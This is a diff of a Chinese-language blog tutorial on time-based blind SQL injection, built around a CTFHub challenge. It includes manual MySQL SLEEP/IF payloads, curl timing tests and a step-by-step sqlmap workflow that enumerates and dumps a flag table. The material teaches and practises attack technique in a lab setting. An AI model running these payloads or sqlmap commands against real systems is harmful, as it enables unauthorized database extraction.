@@ -1,47 +1,134 @@
 ---
-title: "CTFHub 踩坑记：当「布尔注入」遇上 Time-based Blind SQL 注入"
+title: "深入理解 Time-based Blind SQL 注入：原理、利用与 sqlmap 实操"
 date: 2026-06-03T21:30:00+08:00
 draft: false
 tags: ["CTF", "Web安全", "SQL注入", "sqlmap", "Time-based Blind"]
 categories: ["技术笔记"]
 ---
 
-## 前言
+## 一、什么是 Blind SQL 注入
 
-最近在刷 CTFHub 的 SQL 注入系列，做到一个分类为**"布尔注入"**的题目，结果用 sqlmap 跑的时候直接"卡住"了。排查了一圈才发现，这个题目实际上的注入类型是 **Time-based Blind（时间盲注）**，而不是布尔盲注。虽然最终拿到了 flag，但整个过程踩了不少坑，记录一下供大家参考。
+当应用程序存在 SQL 注入漏洞，但**不会在前端直接回显查询结果或错误信息**时，传统的 UNION 注入和报错注入便无法直接使用。此时攻击者只能依赖 **Blind SQL Injection（盲注）** —— 通过观察应用程序的**间接反应**来逐位推断数据库中的数据。
+
+盲注分为两大类：
+
+| 类型 | 判断依据 | 速度 |
+|------|---------|------|
+| **Boolean-based Blind（布尔盲注）** | 页面返回内容/长度是否有差异 | 较快 |
+| **Time-based Blind（时间盲注）** | 响应时间是否有延迟 | 很慢 |
+
+当页面无论查询成功还是失败都返回**完全相同的响应**时，布尔盲注失效，时间盲注成为唯一选择。
 
 ---
 
-## 题目信息
+## 二、Time-based Blind 注入原理
 
-- **平台**：CTFHub
-- **题目分类**：布尔注入
-- **目标 URL**：`http://challenge-6e6c191bf8163cef.sandbox.ctfhub.com:10800/?id=1`
-- **后端**：MySQL >= 5.0.12 (MariaDB fork)
+### 2.1 核心思想
+
+时间盲注不依赖页面内容的变化，而是利用数据库的**时间延迟函数**（如 MySQL 的 `SLEEP()`、PostgreSQL 的 `pg_sleep()`、SQL Server 的 `WAITFOR DELAY`）来构造条件：
+
+- 条件为**真** → 执行 `SLEEP(n)` → 响应延迟 n 秒
+- 条件为**假** → 不执行延迟 → 响应正常
+
+通过测量响应时间，攻击者就能判断条件的真假，从而逐位提取数据。
+
+### 2.2 手工 Payload 示例
+
+以 MySQL 为例，假设注入点为 `?id=1`，目标是获取 `flag` 表中的 `flag` 字段：
+
+```sql
+-- 判断数据库名第一个字符是否为 's'
+?id=1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))=115, SLEEP(5), 0)
+
+-- 判断 flag 表第一条记录的第一个字符是否为 'c'
+?id=1 AND IF(ASCII(SUBSTRING((SELECT flag FROM flag LIMIT 0,1),1,1))=99, SLEEP(5), 0)
+```
+
+**执行逻辑**：
+1. 服务端收到请求，拼接 SQL 执行
+2. 如果 `SUBSTRING(...)` 的结果确实是 `99`（即 `'c'`），则执行 `SLEEP(5)`
+3. 客户端观察到响应耗时约 5 秒 → 推断该位为 `'c'`
+4. 如果响应立即返回 → 该位不是 `'c'`，继续尝试其他字符
+
+### 2.3 为什么是「逐位猜解」
+
+时间盲注无法一次性获取完整字符串，必须：
+
+1. **逐字符**：先猜第 1 个字符，再猜第 2 个...
+2. **逐位尝试**：每个字符从 ASCII 32 到 126 逐个试，或用二分查找优化
+3. **逐行遍历**：如果有多条记录，还要 `LIMIT n,1` 遍历
+
+假设 flag 长度为 30 个字符，每个字符平均尝试 40 次（二分查找），每次请求延迟 3 秒：
+
+```
+30 字符 × 40 次 × 3 秒 = 3600 秒 ≈ 1 小时
+```
+
+这就是时间盲注「慢」的本质——**信息是通过「时间」这个单比特信道传输的**。
 
 ---
 
-## 现象：sqlmap "卡住"了
+## 三、与布尔盲注的对比
 
-一开始直接用 sqlmap 跑：
+| 维度 | Boolean-based Blind | Time-based Blind |
+|------|---------------------|------------------|
+| **判断信号** | 页面内容差异（长度/关键字） | 响应时间差异 |
+| **Payload 示例** | `AND 1=1` vs `AND 1=2` | `AND IF(1=1, SLEEP(5), 0)` |
+| **单次请求耗时** | 正常网络延迟（毫秒级） | SLEEP(n) 延迟（秒级） |
+| **网络稳定性要求** | 低 | 高（波动会影响判断） |
+| **适用场景** | 页面存在真假差异 | 页面完全无差异 |
+
+**关键认知**：时间盲注是布尔盲注的「降级替代方案」。当布尔盲注不可行时才启用时间盲注。如果题目同时支持两种注入，应优先使用布尔盲注。
+
+---
+
+## 四、手工验证：确认注入点类型
+
+在丢给 sqlmap 之前，建议先用 `curl` 手工验证目标到底支持哪种注入：
 
 ```bash
-python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --tables
+# 1. 正常请求（基准）
+curl -s -o /dev/null -w "%{time_total}" \
+  "http://target.com/?id=1"
+# 输出: 0.2s
+
+# 2. 时间盲注测试：条件为真，预期延迟 5 秒
+curl -s -o /dev/null -w "%{time_total}" \
+  "http://target.com/?id=1 AND IF(1=1, SLEEP(5), 0)"
+# 输出: 5.2s ← 有明显延迟，确认存在时间盲注
+
+# 3. 时间盲注测试：条件为假，预期不延迟
+curl -s -o /dev/null -w "%{time_total}" \
+  "http://target.com/?id=1 AND IF(1=2, SLEEP(5), 0)"
+# 输出: 0.2s ← 无延迟，条件判断生效
+
+# 4. 布尔盲注测试：检查页面长度是否有差异
+curl -s "http://target.com/?id=1 AND 1=1" | wc -c
+curl -s "http://target.com/?id=1 AND 1=2" | wc -c
+# 如果两者长度完全相同 → 布尔盲注不可行
 ```
 
-结果 sqlmap 跑到一半就不动了，屏幕上一直显示：
-
-```
-.............................. (done)
-```
-
-等了很久也没输出表名。第一反应是网络问题或者 sqlmap 挂了，但实际上它是**正在工作**，只是慢得让人以为卡住了。
+如果步骤 2/3 出现明显延迟差异，而步骤 4 的页面长度完全一致，则可以确认目标只有 **Time-based Blind** 注入。
 
 ---
 
-## 原因分析：Time-based Blind 注入
+## 五、sqlmap 自动化利用（实操）
 
-后来加上 `--batch` 参数让它自动运行，才发现真相：
+### 5.1 题目环境
+
+- **平台**：CTFHub
+- **目标**：`http://challenge-6e6c191bf8163cef.sandbox.ctfhub.com:10800/?id=1`
+- **后端**：MySQL >= 5.0.12 (MariaDB fork)
+- **实际注入类型**：Time-based Blind（`SLEEP(5)`）
+
+### 5.2 基础检测
+
+```bash
+python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
+  --batch --technique=T
+```
+
+输出：
 
 ```
 Type: time-based blind
@@ -49,161 +136,108 @@ Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
 Payload: id=2766 AND (SELECT 4051 FROM (SELECT(SLEEP(5)))PyfQ)
 ```
 
-**原来这个题目的实际注入类型是 Time-based Blind，每次查询都要执行 `SLEEP(5)`。**
+### 5.3 关键参数详解
 
-这意味着 sqlmap 每猜一个字符，都要等待至少 5 秒钟。枚举表名可能需要发几十上百个请求，dump 数据时甚至可能要等几十分钟。屏幕上那些 `.......` 不是卡住了，而是 sqlmap 在收集统计基线，用于判断"这次请求是否延迟了"。
+| 参数 | 作用 | 建议值 |
+|------|------|--------|
+| `--batch` | 自动回答所有交互提问，避免中途停下来等输入 | 必须加 |
+| `--technique=T` | 强制只使用 Time-based blind 技术 | 已知注入类型时加 |
+| `--time-sec=3` | 设置延迟时间（默认 5 秒） | 3-5 秒，网络差则加大 |
+| `--threads=10` | 并发线程数 | 10，time-based 下提升有限 |
+| `--level=3` | 检测深度 | 默认 1，提高会测试更多 payload |
+| `--risk=1` | 风险等级 | 默认 1，CTF 场景通常够用 |
+| `--flush-session` | 清空缓存，重新检测 | 换注入类型时加 |
 
----
+### 5.4 完整利用流程
 
-## 踩坑一：没加 `--batch`，sqlmap 停下来等输入
-
-Time-based blind 模式下，sqlmap 会弹出一个交互式提问：
-
-```
-do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
-```
-
-如果不加 `--batch`，sqlmap 就会停在这里等你回答 `Y` 或 `n`。很多人（包括我）以为这是"卡住了"，实际上只是 sqlmap 在等用户输入。
-
-**正确做法**：始终加上 `--batch`，让 sqlmap 自动选择默认值。
-
-```bash
-python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --batch --tables
-```
-
----
-
-## 踩坑二：题目叫"布尔注入"，但实际是时间盲注
-
-因为 CTFHub 把这个题归类为"布尔注入"，我首先尝试用 `--technique=B` 强制只检测布尔盲注：
-
-```bash
-python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --batch --technique=B --level=3 --tables
-```
-
-结果 sqlmap 跑了一大圈，最终输出：
-
-```
-[ERROR] all tested parameters do not appear to be injectable.
-```
-
-**布尔盲注没检测到。** 这说明要么这个题目的页面回显差异非常微妙，sqlmap 无法识别；要么题目分类名和实际环境不匹配。无论如何，sqlmap 最终只能识别出 time-based blind 注入点。
-
----
-
-## 踩坑三：错误设置 `--time-sec`
-
-在优化提示时，我一度尝试把 `--time-sec` 设成 `0.1`，想让它跑快一点：
-
-```bash
-# 错误！不要在 Y/n 提示里输入数字
-# 而且 0.1 秒对于 time-based blind 来说太小了
-```
-
-结果不仅没用，还导致：
-
-```
-[CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
-```
-
-**原因**：`--time-sec` 设得太小，正常的网络波动都可能超过 0.1 秒，sqlmap 根本无法区分"正常响应"和"注入延迟"，导致大量误判和重试。
-
-**正确做法**：
-- `Y/n` 问题只回答 `Y` 或 `n`
-- 如果要手动设置延迟，用参数形式：`--time-sec=3`
-- 建议值至少为 3-5 秒
-
----
-
-## 正确的 sqlmap 命令
-
-对于这个 time-based blind 注入的靶场，正确的打开方式是：
-
-### 1. 枚举表名
+**Step 1：枚举数据库**
 
 ```bash
 python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
-  --batch \
-  --technique=T \
-  --time-sec=3 \
-  --threads=10 \
-  --tables
+  --batch --technique=T --time-sec=3 --threads=10 --dbs
 ```
 
-### 2. 直接 dump flag（假设表名 flag，列名 flag）
+**Step 2：枚举表名**
 
 ```bash
 python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
-  --batch \
-  --technique=T \
-  --time-sec=3 \
-  --threads=10 \
-  -T flag -C flag --dump
+  --batch --technique=T --time-sec=3 --threads=10 \
+  -D sqli --tables
 ```
 
-### 关键参数说明
+**Step 3：枚举列名**
 
-| 参数 | 作用 |
-|------|------|
-| `--batch` | 自动回答所有交互式提问，不会中途停下来 |
-| `--technique=T` | 强制使用 Time-based blind 技术 |
-| `--time-sec=3` | 设置延迟时间为 3 秒（默认 5 秒） |
-| `--threads=10` | 多线程并发，略微加速 |
-| `--flush-session` | 清空之前的 session，重新检测 |
-
----
-
-## Time-based Blind 为什么慢？
-
-Time-based blind 注入的核心逻辑是：
-
-```sql
--- 如果第一个字符是 'c'，延迟 5 秒
-id=1 AND IF(SUBSTRING((SELECT flag FROM flag),1,1)='c', SLEEP(5), 0)
+```bash
+python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
+  --batch --technique=T --time-sec=3 --threads=10 \
+  -D sqli -T flag --columns
 ```
 
-sqlmap 需要**逐个字符、逐位猜解**，每次请求都要等 `SLEEP()` 执行完。一个 30 个字符的 flag，如果每个字符平均试 40 次（二分查找优化后），总共要发 1200 个请求，每个等 3-5 秒，**总时间约为 1-2 小时**。
+**Step 4：Dump 数据**
 
-这也是为什么它会"一个字母一个字母地蹦"出来：
+```bash
+python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" \
+  --batch --technique=T --time-sec=3 --threads=10 \
+  -D sqli -T flag -C flag --dump
+```
+
+### 5.5 sqlmap 的输出特征
+
+运行过程中会看到：
+
+```
+[WARNING] time-based comparison requires larger statistical model, please wait
+.............................. (done)
+```
+
+这是 sqlmap 在发大量请求收集**响应时间的统计基线**，用于判断「这次请求是否属于延迟」。不是卡住了，是正常流程。
+
+数据提取时会「一个字母一个字母地蹦」：
 
 ```
 ctfhub{2c...
 ```
 
+因为 sqlmap 正在逐字符猜解，每猜对一个字符就输出一次。
+
 ---
 
-## sqlmap 的 session 恢复机制
+## 六、踩坑实录（附）
 
-sqlmap 会把检测到的注入点保存到 session 文件中（通常在 `~/.local/share/sqlmap/output/`）。下次运行时，它会直接恢复 session，不再重新检测。
+这次实操过程中遇到的几个典型问题：
 
-这也导致了一个问题：**如果 session 里已经存了 time-based blind，即使你想测其他注入类型，sqlmap 也会优先用 session 里的结果。**
+### 坑 1：没加 `--batch`，sqlmap 停下来等输入
 
-如果要重新检测，必须加 `--flush-session`：
+Time-based 模式下 sqlmap 会问：
 
-```bash
-python sqlmap.py -u "http://challenge-xxx.sandbox.ctfhub.com:10800/?id=1" --flush-session --batch --tables
+```
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n]
 ```
 
+不加 `--batch` 就会停在这里，看起来像「卡住」。
+
+### 坑 2：题目分类误导
+
+CTFHub 把这个题放在「布尔注入」分类下，但实际环境只有 time-based blind。用 `--technique=B` 强制检测布尔盲注会一无所获。
+
+**教训**：工具检测出的实际注入类型比平台分类名更可靠。
+
+### 坑 3：错误设置 `--time-sec`
+
+不要在 Y/n 提示里输入数字，也不建议把 `--time-sec` 设得太小（如 0.1 秒）。正常的网络波动都可能超过这个值，导致 sqlmap 完全无法判断真假。
+
+### 坑 4：session 缓存干扰
+
+sqlmap 会把检测到的注入点保存在 session 中。如果之前测出了 time-based，之后即使想测布尔盲注，sqlmap 也可能直接恢复 session 中的结果。
+
+**解决**：加 `--flush-session` 清空缓存重新检测。
+
 ---
 
-## 总结
+## 七、总结
 
-| 问题 | 原因 | 解决方案 |
-|------|------|---------|
-| sqlmap "卡住"不动 | Time-based blind 每个请求要等 SLEEP(5) | 耐心等，或者加 `--threads=10` |
-| 中途停下来问 Y/n | 没加 `--batch` | 始终加 `--batch` |
-| 布尔盲注检测不到 | 实际只有 time-based blind | 用 `--technique=T` |
-| 设置了错误的 time-sec | 在 Y/n 提示里输入了数字，或值太小 | 用 `--time-sec=3`，只在参数里设 |
-| 想换注入类型但没用 | session 里存了旧结果 | 加 `--flush-session` |
+Time-based Blind SQL 注入是一种**信息论意义上的「降维攻击」**——将数据库中的多比特信息，压缩成「延迟/不延迟」这一个二进制信号传输出来。正是这种极端的信息压缩，导致了它的慢。
 
----
+理解这一点后，sqlmap 的那些「卡顿」「一个字母一个字母地蹦」就不再神秘了。它不是 bug，是时间盲注入的工作方式决定的。
 
-## 经验教训
-
-1. **CTFHub 的题目分类不一定准确**，实际环境配置可能和分类名不一致。
-2. **sqlmap 的 `--batch` 参数很重要**，不加它会在交互提问处停下来。
-3. **Time-based blind 就是慢**，这不是 bug，是它的工作方式。如果题目支持报错注入或 UNION 注入，会快几十倍。
-4. **session 文件会记住之前的检测结果**，想重新扫描要 `--flush-session`。
-5. **不要随手改 `--time-sec` 为很小的值**，网络波动会毁掉所有判断。
-
-这个题目虽然分类叫"布尔注入"，但最终是靠 time-based blind 拿下的 flag。sqlmap 是个强大的工具，但了解它的工作原理和各种参数的含义，才能真正用好它。
+对于 CTF 选手来说，掌握手工验证方法和 sqlmap 的核心参数，能够在面对盲注场景时快速定位注入类型并选择合适的利用策略。
